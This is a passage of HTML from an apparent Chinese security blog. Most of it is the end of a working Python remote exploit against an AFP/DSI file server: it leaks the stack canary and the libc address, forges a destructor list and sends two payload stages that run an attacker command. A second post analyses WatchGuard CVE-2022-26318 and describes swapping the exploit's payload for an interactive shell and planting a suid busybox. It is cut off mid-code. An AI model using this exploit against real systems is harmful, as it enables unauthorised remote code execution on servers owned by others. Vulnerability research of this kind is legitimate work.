server_name = body[<span class="number">11</span>:server_name_length + <span class="number">11</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got server name: %s&quot;</span> % server_name.decode())</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">10</span> + server_name_length + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> pos % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        pos += <span class="number">1</span>    <span class="comment"># padding</span></span><br><span class="line"></span><br><span class="line">    server_signature_offset = body[pos:pos + <span class="number">2</span>]</span><br><span class="line">    network_addresses_count_offset = body[pos + <span class="number">2</span>:pos + <span class="number">4</span>]</span><br><span class="line">    directory_names_count_offset = body[pos + <span class="number">4</span>:pos + <span class="number">6</span>]</span><br><span class="line">    utf8_server_name_offset = body[pos + <span class="number">6</span>:pos + <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    machine_type_length = body[machine_type_offset]</span><br><span class="line">    machine_type = body[pos + <span class="number">9</span>:pos + machine_type_length + <span class="number">9</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got machine type: %s&quot;</span> % machine_type.decode())</span><br><span class="line">    <span class="keyword">if</span> machine_type.decode() <span class="keyword">not</span> <span class="keyword">in</span> SUPPORT_VERSION:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Target not support.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># continue parse seems not necessary</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_parse_openSession</span>(<span class="params">data</span>):</span><br><span class="line">    error_code,body = _get_body_error_code(data)</span><br><span class="line">    <span class="keyword">if</span> error_code[<span class="number">0</span>] != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] OpenSession failed.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print(&quot;[+] OpenSession success&quot;)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_open_session</span>():</span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">         s.connect((R_HOST, R_PORT))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error connecting server&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print(&quot;[*] OpenSession&quot;)</span></span><br><span class="line">    _open_session_packet = DSI(<span class="number">0x0</span>, DSI_OpenSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_open_session_packet)</span><br><span class="line">    simple_parse_openSession(s.recv(MAX_RECV_LENGTH))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak_one</span>(<span class="params">sock, canary</span>):</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * tls_padding_length + <span class="string">b&quot;tcb__ptr&quot;</span> + <span class="string">b&quot;dtv__ptr&quot;</span> + <span class="string">b&quot;self_ptr&quot;</span> + <span class="string">b&quot;mult&quot;</span> + <span class="string">b&quot;scop&quot;</span> + <span class="string">b&quot;_sysinfo&quot;</span></span><br><span class="line">    payload += canary</span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    sock.send(_packet)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    data = sock.recv(MAX_RECV_LENGTH)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak</span>(<span class="params">n, canary</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] ==== Byte%d ====&quot;</span> % n)</span><br><span class="line">    _succ = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">        <span class="comment"># print(&quot;[*]     Trying &quot; + str(i))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock = connect_open_session()</span><br><span class="line">            _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, ((i &lt;&lt; (n * <span class="number">8</span>)) | canary))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> _leak_one(sock, _tmp):</span><br><span class="line">                canary = ((i &lt;&lt; <span class="number">8</span>) | canary)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sock.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got byte%d: %d&quot;</span> % (n, i))</span><br><span class="line">    <span class="comment"># if i == 0:</span></span><br><span class="line">    <span class="comment">#     print(&quot;[-] Error leaking canary. Try again&quot;)</span></span><br><span class="line">    <span class="comment">#     exit(0)</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_canary</span>():</span><br><span class="line">    canary = <span class="number">0x0</span>    <span class="comment"># canary lowest byte == 0x00</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Leaking canary (stable)...&quot;</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">1</span>, canary) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">2</span>, canary) &lt;&lt; <span class="number">16</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">3</span>, canary) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">4</span>, canary) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">5</span>, canary) &lt;&lt; <span class="number">40</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">6</span>, canary) &lt;&lt; <span class="number">48</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">7</span>, canary) &lt;&lt; <span class="number">56</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak_one2</span>(<span class="params">sock, value</span>):</span><br><span class="line">    payload = <span class="string">b&quot;\x00&quot;</span> * nl_global_locale_padding_offset</span><br><span class="line">    payload += value</span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _crash_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    sock.sendall(_crash_packet)</span><br><span class="line"></span><br><span class="line">    _close_packet = DSI(<span class="number">0x0</span>, DSI_CloseSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    sock.sendall(_close_packet)</span><br><span class="line">    sock.recv(MAX_RECV_LENGTH)</span><br><span class="line">    sock.send(<span class="string">b&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">    sock.recv(MAX_RECV_LENGTH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak2</span>(<span class="params">n, global_locale, _step=<span class="number">1</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] ==== Byte%d ====&quot;</span> % n)</span><br><span class="line">    vals = []</span><br><span class="line">    _succ = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x100</span>, _step):</span><br><span class="line">        <span class="comment"># print(&quot;[*]     Trying &quot; + str(i))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock = connect_open_session()</span><br><span class="line">            _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (((i) &lt;&lt; (n * <span class="number">8</span>)) | global_locale))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> _step == <span class="number">0x10</span>:</span><br><span class="line">                _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (((i + <span class="number">4</span>) &lt;&lt; (n * <span class="number">8</span>)) | global_locale))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># print(_tmp)</span></span><br><span class="line">            _leak_one2(sock, _tmp)</span><br><span class="line">            <span class="keyword">if</span> _step == <span class="number">0x10</span>:</span><br><span class="line">                vals.append(i + <span class="number">4</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                vals.append(i)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">return</span> vals</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    global_locale = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Leaking libc (unstable)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    byte0 = [<span class="number">0x20</span>]</span><br><span class="line">    byte1 = []</span><br><span class="line">    byte2 = []</span><br><span class="line">    byte3 = []</span><br><span class="line">    byte4 = []</span><br><span class="line">    byte5 = [<span class="number">0x7f</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte0&quot;</span> % <span class="built_in">len</span>(byte0))</span><br><span class="line">    <span class="keyword">for</span> m_byte0 <span class="keyword">in</span> byte0:</span><br><span class="line">        global_locale = global_locale | m_byte0</span><br><span class="line">        byte1 = _leak2(<span class="number">1</span>, global_locale, <span class="number">0x10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte1) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte0)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(byte1)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte1) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte1) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte1&quot;</span> % <span class="built_in">len</span>(byte1))</span><br><span class="line">    <span class="keyword">for</span> m_byte1 <span class="keyword">in</span> byte1:</span><br><span class="line">        global_locale = global_locale | (m_byte1 &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        byte2 = _leak2(<span class="number">2</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte2) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte1)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte2)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte2) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte2) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte2&quot;</span> % <span class="built_in">len</span>(byte2))</span><br><span class="line">    <span class="keyword">for</span> m_byte2 <span class="keyword">in</span> byte2:</span><br><span class="line">        global_locale = global_locale | (m_byte2 &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        byte3 = _leak2(<span class="number">3</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte3) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte2)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte3)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte3) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte3) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte3&quot;</span> % <span class="built_in">len</span>(byte3))</span><br><span class="line">    <span class="keyword">for</span> m_byte3 <span class="keyword">in</span> byte3:</span><br><span class="line">        global_locale = global_locale | (m_byte3 &lt;&lt; <span class="number">24</span>)</span><br><span class="line">        byte4 = _leak2(<span class="number">4</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte4) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte3)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">24</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte4)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte4) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte4) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte4&quot;</span> % <span class="built_in">len</span>(byte4))</span><br><span class="line">    <span class="keyword">for</span> m_byte4 <span class="keyword">in</span> byte4:</span><br><span class="line">        global_locale = global_locale | (m_byte4 &lt;&lt; <span class="number">32</span>)</span><br><span class="line">        byte5 = _leak2(<span class="number">5</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte5) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte4)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte5)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte5) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte5) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    global_locale |= (byte5[<span class="number">0</span>] &lt;&lt; <span class="number">40</span>)</span><br><span class="line">    libc_addr = global_locale - nl_global_locale_offset</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got libc: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    <span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ISHFTC</span>(<span class="params">n, d, N</span>):  </span><br><span class="line">    <span class="keyword">return</span> ((n &lt;&lt; d) % (<span class="number">1</span> &lt;&lt; N)) | (n &gt;&gt; (N - d))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Connecting to %s:%d ...&quot;</span> % (R_HOST, R_PORT))</span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">         s.connect((R_HOST, R_PORT))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error connecting server&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Fetching server info ...&quot;</span>)</span><br><span class="line">    _get_srv_info_packet = DSI(<span class="number">0x0</span>, DSI_FPGetSrvrInfo, <span class="number">0x0101</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_get_srv_info_packet)</span><br><span class="line">    simple_parse_srvInfo(s.recv(MAX_RECV_LENGTH))</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    canary = leak_canary()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    libc_addr = leak_libc()</span><br><span class="line">    </span><br><span class="line">    s = connect_open_session()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Deploy payload (stage 1)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    enc_system_address = ISHFTC(libc_addr + <span class="number">0x0000000000453A0</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    enc_execl_addr = ISHFTC(<span class="number">0x000000000408DA0</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    enc_popen_addr = ISHFTC(libc_addr + <span class="number">0x00000000006F610</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    setcontext_addr = ISHFTC(libc_addr + <span class="number">0x000000000047B97</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    fake_dtor_list = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, setcontext_addr) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, username_address) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x0</span>) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    gold = fake_dtor_list + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, setcontext_addr) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x20</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x656240</span>) + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x80</span> - <span class="number">0x20</span> - <span class="number">8</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x00000000006F5B6</span>) + command</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;\x12&quot;</span> + <span class="string">b&quot;\x06\x41\x46\x50\x33\x2e\x33&quot;</span> + <span class="string">b&quot;\x04\x44\x48\x58\x32&quot;</span> + struct.pack(<span class="string">&quot;&lt;B&quot;</span>, <span class="built_in">len</span>(gold) + <span class="number">0x10</span>) + username + gold + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _fplogin_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    s.send(_fplogin_packet)</span><br><span class="line">    s.recv(MAX_RECV_LENGTH)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Deploy payload (stage 2)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * nl_global_locale_padding_offset + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + nl_global_locale_offset) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x3c8a80</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xb</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x1767a0</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x176da0</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x1776a0</span>) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, username_address) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x3c4b20</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">48</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xc7a700</span> + libc_addr) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0xc79010</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xc7a700</span> + libc_addr) + <span class="string">b&quot;a&quot;</span> * <span class="number">16</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, canary) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _test_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    s.send(_test_packet)</span><br><span class="line"></span><br><span class="line">    _close_packet = DSI(<span class="number">0x0</span>, DSI_CloseSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_close_packet)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Exploit finish.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-26318</title>
    <url>/2022/03/30/CVE-2022-26318/</url>
    <content><![CDATA[<p>2022 年 2 月 28 日，CVE 官方发布了影响 Watchguard 防火墙等设备的 RCE 漏洞 CVE-2022-26318，3 月 27 日，该漏洞的 EXP 开始在网上流传，本文对此漏洞的成因进行分析。</p>
<span id="more"></span>

<h2 id="建立调试环境"><a href="#建立调试环境" class="headerlink" title="建立调试环境"></a>建立调试环境</h2><h3 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h3><p>FireBox 提供的 busybox 经过大量阉割，并且没有 sh，首先通过挂载磁盘的方式修正设备环境。</p>
<p>导入虚拟机之后将其虚拟硬盘挂载到另外一个系统下，将完整版的 busybox 和 sh 放在 &#x2F;bin 目录下，并且赋予它们 suid 权限，然后修改 &#x2F;etc&#x2F;passwd 文件中的 root 用户密码。</p>
<p>之后将 exp 中执行 &#x2F;bin&#x2F;python -i 替换为 &#x2F;bin&#x2F;sh -i，执行后即可获取 shell，不过此时是 nobody 权限，执行以下命令提权到 root</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">busybox su</span><br><span class="line">&lt;输入密码&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-1.png"
                     
                ></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>通过 wget 将 gdbserver 下载到 &#x2F;tmp 目录下，尝试执行会提示无权限，检查 mount 信息发现 &#x2F;tmp 目录被挂载为 noexec，使用以下命令重新挂载</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">mount -o rw,remount /dev/wgrd.var /tmp</span><br></pre></td></tr></table></figure></div>

<p>然后放入的 gdbserver 即可正常运行。</p>
<p>默认情况下只有 web 等向外提供服务的端口可以访问，为了远程调试，我们需要修改防火墙规则。</p>
<p>进入系统后台，在 Firewall 选项下添加新的防火墙规则</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-2.png"
                     
                ></p>
<p>这样防火墙其他端口就可以正常访问了。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据相关公告，存在漏洞的文件是 wgagent，接口为 &#x2F;agent&#x2F;login</p>
<p>逆向分析此文件，搜索 &#x2F;agent&#x2F;login 字符串可以找到处理 login 请求的 handler 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( s1 &amp;&amp; (!<span class="built_in">strcmp</span>(s1, <span class="string">&quot;/login&quot;</span>) || !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;/agent/login&quot;</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">    login_handler(&amp;ptr);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_396;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>login_handler 函数开头就会调用函数 wga_parse_input 处理 POST 数据，部分关键代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">wga_parse_input</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *content_type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    PushParserCtxt = <span class="number">0LL</span>;</span><br><span class="line">    v22 = <span class="number">99999</span>;</span><br><span class="line">    v31 = <span class="number">0</span>;</span><br><span class="line">    is_gzip = <span class="number">0</span>;</span><br><span class="line">    v21 = <span class="number">0</span>;</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">    v28 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( content_type &amp;&amp; !strcasecmp(content_type, <span class="string">&quot;gzip&quot;</span>) )</span><br><span class="line">        ++is_gzip;</span><br><span class="line">    bzero(s, <span class="number">0x100</span>uLL);</span><br><span class="line">    xmlSAX2InitDefaultSAXHandler(s, <span class="number">1LL</span>);</span><br><span class="line">    xmlSAX2InitDefaultSAXHandler(s, <span class="number">1LL</span>);</span><br><span class="line">    s[<span class="number">12</span>] = startDocument;</span><br><span class="line">    s[<span class="number">13</span>] = endDocument;</span><br><span class="line">    s[<span class="number">29</span>] = startElementNs;</span><br><span class="line">    s[<span class="number">30</span>] = endElementNs;</span><br><span class="line">    s[<span class="number">17</span>] = characters;</span><br><span class="line">    s[<span class="number">6</span>] = <span class="number">0LL</span>;                                   <span class="comment">// entityDecl</span></span><br><span class="line">    ptr = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">216uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">        PushParserCtxt = xmlCreatePushParserCtxt(s, ptr, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;filename&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( PushParserCtxt )</span><br><span class="line">        &#123;</span><br><span class="line">            ::s[<span class="number">0</span>] = <span 